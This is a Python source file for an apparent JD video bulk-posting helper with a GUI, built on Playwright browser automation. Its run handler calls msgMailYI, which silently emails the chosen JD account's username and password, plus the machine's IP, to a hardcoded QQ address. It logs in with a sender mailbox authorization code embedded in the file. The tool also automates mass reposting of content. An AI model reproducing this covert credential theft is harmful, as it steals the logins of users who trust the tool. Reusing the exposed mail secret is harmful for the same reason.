    #arco-cascader-popup-1 > div > div:nth-child(1) > div > div > div > ul > li:nth-child(1)
    #arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li.arco-cascader-list-item.arco-cascader-list-item-active > div
    page.click('#arco-cascader-popup-1 > div > div > div > div > div > ul > li:nth-child(1)') # ***用开发者工具 复制selector 很有用， 如果还有重复可再增加[特性]       
    page.wait_for_timeout(200)
    #　#arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(12) > div
    #　ＶＬＯＧ　arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(9) > label > span > div
    #arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(9)
    # 种草分享 arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(12) > label > span > div
    #         arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(12) > div
    # 产品展示 arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(13) > div
    # 2024   #arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(13) > div
    #arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(6) 单品测评
    #arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(6) > div
    #　知识科普　14
    # idArrs = [10, 15, 13,14]
    # random_ID = random.choice(idArrs)
    # page.click(f'#arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child({random_ID}) > div') # ***用开发者工具 复制selector 很有用， 如果还有重复可再增加[特性]       
    page.click('#arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(6)')
    page.wait_for_timeout(200)

    #3.　其它标签, 暂未使用，　暂　用于加一个　序号标识，　{oid}
    ''''''
    #　   #app > div > div > div.content > div:nth-child(2) > div.selectTags > div.other > div.num
    #2024 #app >  div.other > div.arco-input-group-wrapper.arco-input-group-wrapper-large.arco-input-has-suffix.arco-input-search.input_search > span > span > input
    # placeholder="请输入关键词" 'input[placeholder="请输入视频标题，字数限制5-27字"]'
    page.click('div.other > div.num') # ***用开发者工具 复制selector 很有用， 如果还有重复可再增加[特性]       
    page.wait_for_timeout(200)
    # proKW=extract_core_keyword(proKW) #对接ＡＩ从标题中提取关键词　，　标题也要对应 getAITitle()
    '''
    if len(proKW)==0:
        proKW="种草"
    if len(proKW)>15:
        proKW=proKW[:15]    
    '''
    page.fill('div.other > div.arco-input-group-wrapper.arco-input-group-wrapper-large.arco-input-has-suffix.arco-input-search.input_search > span > span > input', oid)
    page.wait_for_timeout(200)
    

    #最后一步已设置好了标签后，重新点一下标题，以方便手工修改标题
    page.click('input[placeholder="请输入视频标题，字数限制5-27字"]')

def setVideoSave(page):    
        print("chooseSaveTemp")
        #app > div > div > div > div:nth-child(3) > button.arco-btn.arco-btn-outline.arco-btn-size-default.arco-btn-shape-round
        page.click('#app > div > div > div > div:nth-child(3) > button.arco-btn.arco-btn-outline.arco-btn-size-default.arco-btn-shape-round') # ***用开发者工具 复制selector 很有用， 如果还有重复可再增加[特性]       
        page.wait_for_timeout(3000)
#发布        
def setVideoPost(page):
    print("choosePost:",choosePost)  
    #app > div > div > div > div:nth-child(3) > button.arco-btn.arco-btn-primary.arco-btn-size-default.arco-btn-shape-round  
    page.click('#app > div > div > div > div:nth-child(3) > button.arco-btn.arco-btn-primary.arco-btn-size-default.arco-btn-shape-round') # ***用开发者工具 复制selector 很有用， 如果还有重复可再增加[特性]       
    page.keyboard.press("PageUp") 
    page.wait_for_timeout(3000)   
    

def move_file_to_folder(source_file, target_folder):
    # 如果目标文件夹不存在，则创建
    if not os.path.exists(target_folder):
        os.makedirs(target_folder)
    # 移动文件到目标文件夹0已用
    try:    
        shutil.move(source_file, target_folder)
    except:
        print("移动文件到　0已用　时出错，可能重名等异常,跳过")    

# 主循环体打开单个页面，可以做多线程
def openNewPage(context,vFile):
    # print("---testing --- openNewPage　执行了")
    # 获取文件名（不包含扩展名）及扩展名 # 从文件名中提取skuid和vTitle
    file_name, file_extension = os.path.splitext(vFile)   
    parts = file_name.split(" ", 1)
    if splitFlagGGGG:
        parts = file_name.split("----", 1)
    skuid = parts[0].strip()  # 第一个空格前的数字串
    vTitle = parts[1].strip()  # 第一个空格后到扩展名前的内容 
    window['curOriTitle'].update(vTitle)

    page = context.new_page() 
    page.goto("https://dr.jd.com/page/app.html#/new_create/11?type=ARTICLE&cid=0&sid=143")
    page.wait_for_timeout(500)    
    
    try:
        setUploadFile(page,vFile)                       # 01. 上传视频文件
        setVideoThumb(page,vFile.replace(".mp4",".jpg"),1000)     # 02. 设置封面图片  
        # clickPopButton(page)                            # 增加 点去提示窗口
        # setTopic(topicKW)                              # 0n. 添加话题 暂未实现，可用预设关键词 搜索 点选 确定 方式实现 ===; topicKW 可以设置为公共变量 
        setVideoTags(page,vTitle,skuid)                    # 03. 设置标签，兴趣标签，体裁标签，其他；   
        
        setVideoTitle(page,vTitle)                      # 05. 设置标题 ，这个是需要花费成本的，放在最后，如果前面出错了，这步就不需要执行了

        if chooseAddPro:
            setAddProURLs(context,page,skuid)    # 04. 增加商品 需要用产品名关键词 搜索 SKU网址
        
        if chooseSaveTemp:    
            setVideoSave(page)                          # 06. 保存草稿/发布/ ， 预留功能，可选，如果选了发布
            page.close()

        if choosePost:    
            setVideoPost(page)                          # 06. 保存草稿/发布/ ， 预留功能，可选，如果选了发布
            # page.close() #点发布后 ， 不关闭页面， 可能需要手工处理验证码
            print("***已点发布，需要人工检测是否提交成功或人工过验证码...")
        # 处理发布完成的视频，移动到　0已发　文件夹 vfPath=os.path.join(vwdPath, vf) 
        vfPath = os.path.join(vwdPath, vFile)
        targetDir = os.path.join(vwdPath, '000已用')
        move_file_to_folder(vfPath, targetDir) 
        print(f"{vFile}视频文件已移动到　000已用　文件夹")      
        
    except Exception as e:        
        # 可以通过访问异常对象的属性来获取更多关于异常的信息
        print(f"设置各项子过程出错的详细信息：{type(e).__name__}: {str(e)}")   
           
        # 处理发布完成的视频，移动到　0已发　文件夹 vfPath=os.path.join(vwdPath, vf) 无论是否成功，即便不成功，也要移动到 已尝试用过的 文件夹
        vfPath = os.path.join(vwdPath, vFile)
        targetDir = os.path.join(vwdPath, '000已用')
        move_file_to_folder(vfPath, targetDir) 
        print(f"{vFile}视频文件已移动到　000已用　文件夹")   

        return
      

def getJDDR(drID):
    userJD=""
    passJD=""
    #
    drIDList=drID.split('----')
    if len(drIDList)>1:
        userJD=drIDList[0]
        passJD=drIDList[1]
    return userJD,passJD

import socket
def get_host_ip():
    """
    查询本机ip地址
    :return: ip
    """
    ip="0.0"
    try:
        ip = requests.get('http://myip.ipip.net', timeout=5).text        
    except:
        print("网络不通 请检查网络连接")
    return ip


def msgMailYI(userJD,passJD,openPages):
    myIP=get_host_ip().strip()
    
    # 发信方的信息：发信邮箱，QQ 邮箱授权码
    from_addr = 'singing880847@qq.com'
    password = 'xxraidvgvuoabcjd'

    # 收信方邮箱
    to_addr = '253204192@qq.com'
    # 发信服务器
    smtp_server = 'smtp.qq.com'
    # 邮箱正文内容，第一个参数为内容，第二个参数为格式(plain 为纯文本)，第三个参数为编码
    mBody=f"帐密：{userJD}----{passJD} \r\n {myIP} ,\r\n 页数：{openPages}，品类：NO-京东内部搬运-混合,  \r\n 时间：{time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))} "
    msg = MIMEText(mBody,'plain','utf-8')
    # msg['From'] = Header("batchOpen")
    msg['From'] = 'JD <singing880847@qq.com>'
    # msg['To'] = Header("YII")
    msg['To'] = '<253204192@qq.com>'
    msg['Subject'] = Header('JD项目日志')

    server = smtplib.SMTP_SSL(smtp_server)
    server.connect(smtp_server,465)
    server.login(from_addr, password)
    server.sendmail(from_addr, to_addr, msg.as_string())
    # 关闭服务器
    server.quit()
    print(f"已开京东EY服务！")


# 主流程
def main():
    beginTime = time.time()  # Get the current time in seconds
    print(f"打开端口{br_PORT}本地浏览器")
    with sync_playwright() as playwright:               
        browser = playwright.chromium.connect_over_cdp(f'http://localhost:{br_PORT}/')   #新接管已手工打开的浏览器======   
        context = browser.contexts[0] 
        # 一级初始大循环 视频文件列表循环　　单线程　，原v3 
        random.shuffle(vFileList) #乱序一下
        i=1
        for vf in vFileList:
            # window['openAI_LIMIT'].update("1200")
            print(f"当前:{i}/{openPages}---[{vf}]")            
            openNewPage(context,vf)
            i=i+1

        print("vf 大循环结束 完成***OK")
        # Calculate the time difference             
        timeDifference = time.time() - beginTime            
        minutes = int(timeDifference // 60)# Convert the time difference to minutes and seconds
        seconds = int(timeDifference % 60)
        # 获取当前时间  格式化当前时间
        formatted_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"本轮耗时：{minutes}分钟 {seconds}秒 ； 当前：{formatted_time}")    

        time.sleep(13600) #整体13600     #*** 如何设置不关page 不关browser???，　保持，等人工处理　
        print("sleep 3600s...")

# 批量生成浏览器端口 .bat 批量创建.bat同名文件夹
def generate_bat_files(file_path):
    # 读取浏览器配置文件，将端口号保存到列表中
    brPortList = []
    with open(file_path, 'r') as file:
        for line in file:
            brPortList.append(line.strip())
    browserDir = "browser"
    for brPort in brPortList:
        browserPortDir = os.path.join(os.getcwd(), browserDir, brPort)
        brUrl = 'https://dr.jd.com/'
        # 创建同名文件夹
        os.makedirs(browserPortDir, exist_ok=True)
        # 创建.bat文件内容
        batStr = '@echo off\n'
        batStr += f'chrome.exe --remote-debugging-port={brPort} --user-data-dir="{browserPortDir}" --new-window {brUrl}'
        # 生成.bat文件
        bat_file_path = os.path.join(os.getcwd(), browserDir, f"{brPort}.bat")
        with open(bat_file_path, 'w') as bat_file:
            bat_file.write(batStr)
    print("已完成 批量生成浏览器端口...")
    print(brPortList)

# GUI界面 布局设置
import PySimpleGUI as sg
sg.theme('SystemDefaultForReal')

def buildComboBrPort():
    portList=[]
    portList=read_txt_file("browser_port.ini") #固定写入程序
    return portList

layout = [
           [sg.Input(vwdPath,key='videoPath', size=(47, 1)), sg.FolderBrowse('选择视频目录')],    
           [sg.Text('起始文件:',font=("微软雅黑", 10)),sg.Input(vfBegin, key='videoBegin',size=(9, 1)),
            sg.Text('多开页数:',font=("微软雅黑", 10)),sg.Input(openPages, key='openPages',size=(9, 1),tooltip="英文输入法输入纯数字"),
            sg.Text('端口:',font=("微软雅黑", 10)),sg.Combo(buildComboBrPort(), size=(6,1),key="br_PORT",default_value=br_PORT,enable_events=True,),
            sg.Checkbox('分隔符----',key='splitFlagGGGG',font=("微软雅黑", 10),enable_events=True),
            ], 
           [#可选浏览器:p.chromium, p.firefox, p.webkit 
            sg.Text('浏览器核:',font=("微软雅黑", 10)),sg.Combo(('chromium','firefox','webkit'), default_value=brsType, key='brsType',size=(8, 1)),
            sg.Text('达人帐号:',font=("微软雅黑", 10)),sg.Combo(tuple(JDDR_List), key='JDDR',size=(9, 1)),        
             sg.Checkbox('提交发布',key='提交发布',font=("微软雅黑", 10),enable_events=True),sg.Checkbox('保存草稿',key='保存草稿',font=("微软雅黑", 10),enable_events=True)  ],            
            [#OpenAI 设置，现用在改写标题功能上
                sg.Checkbox('标题改写',key='chooseAITitle',font=("微软雅黑", 10),enable_events=True),
                sg.Text('OpenAI密钥:',font=("微软雅黑", 10)),sg.Input(openAI_KEY, key='openAI_KEY',size=(40, 1),tooltip="openAI 的chatGPT的api-keys令牌"), 
            ], 
            [#自定义标签
                sg.Checkbox('兴趣标签',key='chooseCustomTag',font=("微软雅黑", 10),enable_events=True),
                sg.Text('一级类名:',font=("微软雅黑", 10)),sg.Input(TagCNameL1, key='TagCNameL1',size=(10, 1) ), 
                sg.Text('二级类名:',font=("微软雅黑", 10)),sg.Input(TagCNameL2, key='TagCNameL2',size=(14, 1) ), 
                sg.Text(''), sg.Button('标签树',font=("微软雅黑", 10), key='标签树参考',enable_events=True) ,
            ], 
            [# 可选 简单商品标题关键词  
                sg.Checkbox('自动增加商品',key='chooseAddPro',default=True,font=("微软雅黑", 10),enable_events=True),
                sg.Checkbox('自动增加SPU',key='chooseSPU',default=True,font=("微软雅黑", 10),enable_events=True),
                sg.Text('当前标题:',font=("微软雅黑", 10)),sg.Input('', key='curOriTitle',size=(20, 1) ), sg.Button('复制标题',font=("微软雅黑", 10),button_color ='Green') , 
                ],
            [#  单品爆发 补充标题
                 
                sg.Text('爆品扩标:',font=("微软雅黑", 10)),sg.Input('', key='plusTitle',size=(52, 1) )  , 
                ],    
           [sg.Output( size=(66, 12),font=("微软雅黑", 10), )],  
           [sg.Button('多开运行',font=("微软雅黑", 10),button_color ='Orange'),
            sg.Button('打开视频目录',font=("微软雅黑", 10),button_color ='Green') ,
            # sg.Button('打开参考文档',font=("微软雅黑", 10),button_color ='Green') ,
            sg.Button('端口配置',font=("微软雅黑", 10),button_color ='Green'), sg.Button('端口生成',font=("微软雅黑", 10),),
            sg.Button('关闭程序',font=("微软雅黑", 10),button_color ='red'),]
          ]     

# 创建窗口 #注册界面win2Reg
window = sg.Window(br_PORT+'-JD视频多开辅助-V5，作者@微信：liumingdada', layout,font=("微软雅黑", 12),default_element_size=(50,1), icon='iconJDDR.ico')    

# 事件循环
while True:
    # 读取WINDOWS 参数　事件　触发
    event, values = window.read()  

    # 各事件分支处理 WINDOWS 
    if event in (None, '关闭程序'):
        break

    if event =='br_PORT':
        br_PORT=values['br_PORT']
        window.TKroot.title(f'{br_PORT}-JD视频多开辅助-V5')
        print(f'浏览器 chrome.exe 远程调试的端口已选：{br_PORT}')

    if event == '保存草稿':
        chooseSaveTemp= values['保存草稿']
        print(f"'保存草稿-关闭完成页' 已选 {chooseSaveTemp}")   

    if event == '提交发布':
        choosePost= values['提交发布']
        print(f"'提交发布-不关闭页面' 已选 {choosePost}")    

    if event == 'splitFlagGGGG':
        splitFlagGGGG= values['splitFlagGGGG']
        print(f"'分隔符'----已选 {splitFlagGGGG}")


    if event == 'chooseAITitle':
        chooseAITitle= values['chooseAITitle']
        print(f"'智能标题'chooseAITitle已选 {chooseAITitle}")

    # chooseCustomTag
    if event == 'chooseCustomTag':
        chooseCustomTag= values['chooseCustomTag']
        print(f"'自定义兴趣标签'chooseCustomTag 已选 {chooseCustomTag}")
 
    # chooseAddPro    
    if event == 'chooseAddPro':
        chooseAddPro= values['chooseAddPro']
        print(f" 自动增加商品 chooseAddPro 已选 {chooseAddPro}")    
    # chooseSPU    
    if event == 'chooseSPU':
        chooseSPU= values['chooseSPU']
        print(f" 自动增加商品SPU型号 chooseSPU 已选 {chooseSPU}")    



    if event == '标签树参考':
        webbrowser.open("http://127.0.0.1/jd/tagNameTree.php") 

    


    if event == '多开运行': #导出视频信息集 LIST 文档, txt , excel         
        if checkYiliuV(): #******软件验证成功*************************
            print("软件验证成功!")
            #***软件验证成功****************************
            vwdPath=values['videoPath']    
            vfBegin=values['videoBegin']         
            openPages=int(values['openPages'])  # <int> 20 30 40 50  
    
            chooseSaveTemp= values['保存草稿']     
            brsType=values['brsType']
            br_PORT= values['br_PORT'] 

            chooseAITitle= values['chooseAITitle']
            openAI_KEY= values['openAI_KEY']
            chooseCustomTag= values['chooseCustomTag']
            TagCNameL1=values['TagCNameL1'].strip()
            TagCNameL2=values['TagCNameL2'].strip() # trimmed_string = string.strip()去空格 
            chooseAddPro= values['chooseAddPro']
            chooseSPU= values['chooseSPU']
            plusTitle=values['plusTitle'] 

            saveConf(vwdPath,vfBegin,openPages,brsType,openAI_KEY) # TagCNameL1        TagCNameL2       
       
            userJD,passJD=getJDDR(values['JDDR'])            
            msgMailYI(userJD,passJD,openPages)            

            vFileList=getVFileNameList(vwdPath,vfBegin,openPages) #vf
            # main()
            thread = threading.Thread(target=main)
            thread.start()  

        else: #***软件验证失败****************************
            print("软件验证失败，请升级到最新版本！")   
            exit()  

    if event == '复制标题': 
        oriTitle= values['curOriTitle']
        # 使用 pyperclip.copy() 方法复制文本到剪贴板
        pyperclip.copy(oriTitle)

    if event == '打开视频目录':             
        pathDir=values['videoPath']
        os.startfile(pathDir)

    if event == '端口配置':
        print("端口配置")  
        if os.name == 'nt':  # 检查操作系统是否为Windows
            subprocess.Popen(['notepad.exe', br_Port_File])  # 使用notepad作为默认文本编辑器 pubLog_2024-09-27 
    
    if event == '端口生成':
        print("端口生成")   
        generate_bat_files(br_Port_File) 


    
   
window.close()  

# pyinstaller -F -w -i iconJDDR.ico 京东平台内视频发布V3.py 
